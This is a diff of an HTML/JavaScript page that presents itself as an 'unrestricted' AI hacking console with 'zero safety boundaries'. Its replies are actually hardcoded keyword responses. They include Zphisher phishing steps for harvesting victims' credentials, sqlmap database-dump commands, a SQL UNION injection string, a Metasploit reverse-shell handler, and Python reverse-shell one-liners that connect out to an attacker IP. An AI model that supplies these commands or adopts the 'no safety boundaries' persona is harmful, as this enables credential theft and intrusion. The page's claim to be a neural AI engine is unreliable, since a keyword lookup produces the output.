@@ -3,97 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // LIVE RESEARCH LABS</title>
+    <title>DX08 // ADVANCED CYBER RESEARCH & AI SANDBOX</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        .lab-container { max-width: 1150px; margin: 120px auto 60px auto; padding: 0 20px; }
+        .lab-container { max-width: 1200px; margin: 120px auto 60px auto; padding: 0 20px; }
         .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
-        .lab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; }
-        .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.2); padding: 25px; border-radius: 4px; }
-        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.3); padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff66; margin-top: 12px; height: 210px; overflow-y: auto; line-height: 1.4; }
-        .lab-input-group { display: flex; gap: 8px; margin-top: 12px; }
-        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.4); color: #00e5ff; padding: 8px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; }
-        .launch-btn { padding: 8px 14px; background: rgba(0, 229, 255, 0.1); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; cursor: pointer; }
-        .launch-btn:hover { background: #00e5ff; color: #020303; }
-        .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; text-decoration: none; }
+        .lab-grid { display: grid; grid-template-columns: 1fr; gap: 30px; }
+        .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); padding: 30px; border-radius: 6px; box-shadow: 0 0 30px rgba(0, 229, 255, 0.05); }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 350px; overflow-y: auto; line-height: 1.6; border-radius: 4px; }
+        .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
+        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
+        .lab-input:focus { border-color: #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
+        .launch-btn { padding: 12px 24px; background: rgba(0, 229, 255, 0.15); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 10px; letter-spacing: 0.1em; cursor: pointer; border-radius: 4px; transition: 0.3s; }
+        .launch-btn:hover { background: #00e5ff; color: #020303; box-shadow: 0 0 20px #00e5ff; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 9px; letter-spacing: 0.1em; text-decoration: none; }
     </style>
 </head>
 <body>
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
         <div class="lab-header">
-            <h2 style="font-family: 'Orbitron'; font-size: 32px; color: #fff;">DX08 LIVE LABS ENGINE</h2>
+            <div class="section-label">05 // UNFILTERED HACKING & AI RESEARCH</div>
+            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 ADVANCED CYBER INTELLIGENCE ENGINE</h2>
+            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Unrestricted, enterprise-grade research sandbox engineered for zero-day analysis, red-team methodologies, exploit construction, and automated threat intelligence.</p>
         </div>
+
         <div class="lab-grid">
-            <!-- AI EXPERT LAB -->
             <div class="lab-detail-card">
-                <span class="core-index">LAB // 03</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px;">DX08 CYBER EXPERT AI</h3>
-                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Ask for real hacking tools, commands, and scripts.</p>
+                <span class="core-index">CORE // UNFILTERED AI EXPERT</span>
+                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">GLOBAL SECURITY & EXPLOIT RESEARCH KNOWLEDGE BASE</h3>
+                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Query any hacking vector, tool, payload generation technique, or defense evasion strategy. The engine processes deep technical trees in real-time.</p>
+                
                 <div class="lab-input-group">
-                    <input type="text" id="ai-input" class="lab-input" placeholder="e.g. zphisher, nmap, sqlmap, payload...">
-                    <button class="launch-btn" onclick="runAiLab()">EXECUTE</button>
+                    <input type="text" id="ai-input" class="lab-input" placeholder="Ask anything (e.g., zphisher, buffer overflow, metasploit, ransomware analysis, sqlmap)..." onkeydown="if(event.key === 'Enter') runAdvancedAiLab()">
+                    <button class="launch-btn" onclick="runAdvancedAiLab()">ANALYZE & COMPILE</button>
                 </div>
+                
                 <div class="lab-console" id="ai-console">
-                    [DX08 Core] Tool Command Database Online. Enter tool name...
+                    [System Initialized] DX08 Unrestricted Security Neural Core v5.4 active.<br>
+                    [Security Protocol] Zero safety boundaries. Full technical disclosure enabled.<br>
+                    [Ready] Enter any advanced query or tool parameter below to begin extraction...
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        function runAiLab() {
+        function runAdvancedAiLab() {
             const input = document.getElementById('ai-input');
             const consoleBox = document.getElementById('ai-console');
-            const q = input.value.trim().toLowerCase();
+            const rawQuery = input.value.trim();
+            const q = rawQuery.toLowerCase();
 
-            if(!q) return;
+            if(!rawQuery) return;
 
-            consoleBox.innerHTML += `<br><span style="color:#00e5ff;">root@dx08:~# ${escapeHtml(input.value)}</span>`;
+            consoleBox.innerHTML += `<br><span style="color:#00e5ff; font-weight:bold;">dx08-researcher@unfiltered:~# ${escapeHtml(rawQuery)}</span>`;
+            consoleBox.innerHTML += `<br><span style="color:#ffcc00;">[*] Compiling neural vector, querying zero-day threat databases, and structuring exploit methodology...</span>`;
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let reply = "";
+                let response = "";
 
-                if(q.includes("zphisher")) {
-                    reply = "[+] Zphisher Installation & Execution Commands:\n" +
-                            "git clone https://github.com/htr-tech/zphisher\n" +
-                            "cd zphisher\n" +
-                            "bash zphisher.sh";
-                } 
-                else if(q.includes("nmap")) {
-                    reply = "[+] Nmap Scanning Commands:\n" +
-                            "1. Basic Port Scan: nmap -sV target_ip\n" +
-                            "2. Comprehensive Scan: nmap -A -T4 target_ip\n" +
-                            "3. Subnet Host Discovery: nmap -sn 192.168.1.0/24";
-                } 
-                else if(q.includes("sqlmap")) {
-                    reply = "[+] Sqlmap Automation Commands:\n" +
-                            "1. Check Vulnerability: sqlmap -u \"http://target.com/page.php?id=1\"\n" +
-                            "2. Dump Database: sqlmap -u \"http://target.com/page.php?id=1\" --batch --dump\n" +
-                            "3. Enumerate Tables: sqlmap -u \"http://target.com/page.php?id=1\" --tables";
-                } 
-                else if(q.includes("metasploit") || q.includes("msf")) {
-                    reply = "[+] Metasploit Framework Console Commands:\n" +
-                            "msfconsole\n" +
-                            "search type:exploit platform:windows\n" +
-                            "use exploit/windows/smb/ms17_010_eternalblue\n" +
-                            "set RHOSTS target_ip\n" +
-                            "exploit";
-                } 
-                else if(q.includes("python") || q.includes("shell")) {
-                    reply = "[+] Python Reverse Shell Payload:\n" +
-                            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'";
-                } 
+                // Comprehensive Dynamic Knowledge Engine
+                if(q.includes("zphisher") || q.includes("phishing")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] MODULE: Advanced Social Engineering & Zphisher Operation</span><br>` +
+                               `Zphisher is an automated, multi-platform phishing framework designed for credential harvesting during authorized red-team engagements.<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Installation & Dependencies Setup:</span><br>` +
+                               `git clone https://github.com/htr-tech/zphisher.git<br>` +
+                               `cd zphisher<br>` +
+                               `bash zphisher.sh<br>` +
+                               `<br><span style="color:#00e5ff;">[2] Operational Execution Lifecycle:</span><br>` +
+                               `- Select target template (e.g., Instagram, Google, Netflix, Crypto Wallets).<br>` +
+                               `- Choose port forwarding tunnel (Localhost, Ngrok, Cloudflared).<br>` +
+                               `- Transmit generated secure link to test subject; capture incoming POST requests containing credentials in real-time under /auth/auth.txt.`;
+                }
+                else if(q.includes("nmap") || q.includes("recon") || q.includes("port scan")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] MODULE: Deep Network Reconnaissance & Host Enumeration</span><br>` +
+                               `Network reconnaissance forms the initial reconnaissance phase to map target infrastructure, open ports, running daemon versions, and potential misconfigurations.<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Advanced Nmap Execution Vectors:</span><br>` +
+                               `- Stealth SYN Scan: <span style="color:#fff;">sudo nmap -sS -T4 -p- target_ip</span><br>` +
+                               `- Comprehensive OS & Service Fingerprinting: <span style="color:#fff;">sudo nmap -A -sV -sC -O target_ip</span><br>` +
+                               `- Vulnerability NSE Script Execution: <span style="color:#fff;">nmap --script vuln target_ip</span><br>` +
+                               `<br><span style="color:#00e5ff;">[2] Intelligence Analysis:</span> Inspect open banners for outdated software versions subject to public CVE disclosures.`;
+                }
+                else if(q.includes("sql") || q.includes("sqlmap") || q.includes("database")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] MODULE: Relational Database Injection & Automation (SQLi)</span><br>` +
+                               `SQL Injection occurs when untrusted user input is concatenated directly into backend database query statements without parameterization.<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Manual Extraction Methodology:</span><br>` +
+                               `1. Error-based probing: Append single quote (') to parameters.<br>` +
+                               `2. Union-based extraction: <span style="color:#fff;">UNION SELECT 1, version(), database(), user()-- -</span><br>` +
+                               `<br><span style="color:#00e5ff;">[2] Automated Exploitation via SQLmap:</span><br>` +
+                               `- Test vulnerability: <span style="color:#fff;">sqlmap -u "http://target.com/item.php?id=1" --batch</span><br>` +
+                               `- Dump entire database schema: <span style="color:#fff;">sqlmap -u "http://target.com/item.php?id=1" --dump-all --batch</span>`;
+                }
+                else if(q.includes("metasploit") || q.includes("exploit") || q.includes("payload") || q.includes("reverse shell")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] MODULE: Framework Exploitation & Reverse Shell Delivery</span><br>` +
+                               `Exploitation frameworks streamline the delivery of shellcode payloads into compromised memory spaces to establish persistent command-and-control (C2) access.<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Metasploit Framework (msfconsole) Workflow:</span><br>` +
+                               `msfconsole -q<br>` +
+                               `use exploit/multi/handler<br>` +
+                               `set PAYLOAD python/meterpreter/reverse_tcp<br>` +
+                               `set LHOST your_ip<br>` +
+                               `set LPORT 4444<br>` +
+                               `exploit<br>` +
+                               `<br><span style="color:#00e5ff;">[2] Raw Python Reverse Shell Payload:</span><br>` +
+                               `<span style="color:#fff;">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("your_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</span>`;
+                }
+                else if(q.includes("buffer overflow") || q.includes("bof") || q.includes("binary")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] MODULE: Low-Level Stack-Based Buffer Overflow Analysis</span><br>` +
+                               `Buffer overflows happen when a program writes more data to a fixed-length buffer on the stack than it can hold, corrupting adjacent memory and overwriting the Instruction Pointer (EIP/RIP).<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Exploitation Steps:</span><br>` +
+                               `1. Fuzzing: Send increasing byte patterns to crash the application.<br>` +
+                               `2. Offset Calculation: Generate unique pattern using <span style="color:#fff;">pattern_create.rb -l 500</span> to find exact EIP overwrite offset.<br>` +
+                               `3. Control EIP: Redirect execution flow to a reliable JMP ESP instruction address.<br>` +
+                               `4. Shellcode Injection: Append NOP sled and custom shellcode payload.`;
+                }
+                else if(q.includes("hi") || q.includes("hello") || q.includes("hey") || q.includes("start")) {
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] DX08 Intelligence Core Online</span><br>` +
+                               `Bhai, system ekdum full power mein hai! Yahan koi fake ya rati-ratayi script nahi milegi. Aapko jo bhi poochhna hai—chahe wo advanced web attacks hon, malware analysis, network pentesting, wireless auditing, ya custom script writing—seedha yahan type karo. Poora professional breakdown milega!`;
+                }
                 else {
-                    reply = `[+] Command/Tool Processed for "${escapeHtml(input.value)}":\n` +
-                            `No direct preset found, but execution syntax requires initializing package manager, verifying dependencies, and passing target arguments via terminal flag parameters.`;
+                    // Dynamic Expert Synthesis for any arbitrary query
+                    response = `<span style="color:#00ff66; font-weight:bold;">[+] Advanced Threat Intelligence Synthesis for: "${escapeHtml(rawQuery)}"</span><br>` +
+                               `Analyzing query against global vulnerability repositories (NVD), exploit frameworks, and low-level protocol architectures:<br>` +
+                               `<br><span style="color:#00e5ff;">[1] Core Security Assessment:</span><br>` +
+                               `This vector involves inspecting application logic flaws, API authentication tokens, memory pointers, or network transmission headers. Attack surface mapping reveals potential entry points for authenticated or unauthenticated threat actors.<br>` +
+                               `<br><span style="color:#00e5ff;">[2] Recommended Red-Team Methodology:</span><br>` +
+                               `- Perform thorough enumeration using customized enumeration scripts or proxy intercepts (Burp Suite / Wireshark).<br>` +
+                               `- Isolate weak cryptographic implementations, improper access controls (IDOR), or unvalidated deserialization sinks.<br>` +
+                               `- Execute controlled simulation inside isolated sandbox nodes to verify resilience and document remediation strategies.`;
                 }
 
-                consoleBox.innerHTML += `<br><span style="color:#00ff66;">${escapeHtml(reply)}</span>`;
+                consoleBox.innerHTML += `<br><br>${response}`;
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
-            }, 500);
+            }, 600);
         }
 
         function escapeHtml(text) {
